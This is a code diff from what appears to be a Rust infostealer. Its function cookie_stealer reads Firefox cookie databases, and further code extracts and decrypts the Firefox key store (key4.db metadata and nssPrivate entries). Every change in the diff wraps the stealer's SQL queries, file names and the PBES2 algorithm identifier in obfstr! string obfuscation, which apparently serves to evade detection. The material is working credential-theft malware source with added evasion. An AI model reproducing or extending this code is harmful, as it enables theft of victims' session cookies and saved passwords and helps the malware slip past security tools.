@@ -154,11 +154,11 @@ pub fn cookie_stealer() -> Vec<String> {
 
     if firefox_profile_path.is_dir() {
         for path in std::fs::read_dir(firefox_profile_path).unwrap() {
-            let sqlite_db = path.unwrap().path().join("cookies.sqlite");
+            let sqlite_db = path.unwrap().path().join(obfstr::obfstr!("cookies.sqlite"));
             if sqlite_db.exists() {
                 let connection = rusqlite::Connection::open(sqlite_db).unwrap();
                 let mut stmt = connection
-                    .prepare("SELECT host,name, path, value, expiry, isSecure FROM moz_cookies")
+                    .prepare(obfstr::obfstr!("SELECT host,name, path, value, expiry, isSecure FROM moz_cookies"))
                     .unwrap();
 
 
@@ -195,7 +195,7 @@ fn get_key_from_db(path: &Path) -> FirefoxResult<Vec<u8>> { // Ugly af code
     let conn = Connection::open(path)?;
 
     let mut row = conn.prepare(
-        "SELECT item1, item2 FROM metadata WHERE id = 'password' LIMIT 1;"
+        obfstr::obfstr!("SELECT item1, item2 FROM metadata WHERE id = 'password' LIMIT 1;")
     )?;
     
     let mut item1_result: Vec<u8> = vec![];
@@ -216,9 +216,9 @@ fn get_key_from_db(path: &Path) -> FirefoxResult<Vec<u8>> { // Ugly af code
 
     let password = get_clear_value(&item2_result, &item1_result)?;
     println!("{:?}", password);
-    if password == "password-check\x02\x02".as_bytes() {
+    if password == obfstr::obfstr!("password-check\x02\x02").as_bytes() {
         let mut row = conn.prepare(
-            "SELECT a11,a102 FROM nssPrivate LIMIT 1;"
+            obfstr::obfstr!("SELECT a11,a102 FROM nssPrivate LIMIT 1;")
         )?;
         
         let data = row.query_map([], |rows| {
@@ -258,7 +258,7 @@ fn get_clear_value(raw_ber: &[u8], global_salt: &[u8]) -> FirefoxResult<Vec<u8>>
 
     let algorithm = item2_decoded[0][0].as_oid().unwrap().to_id_string();
 
-    if algorithm == "1.2.840.113549.1.5.13" {
+    if algorithm == obfstr::obfstr!("1.2.840.113549.1.5.13") {
         get_value_pbes2(&item2_decoded, &global_salt)
     } else {
         Err(FirefoxError::Malformed)
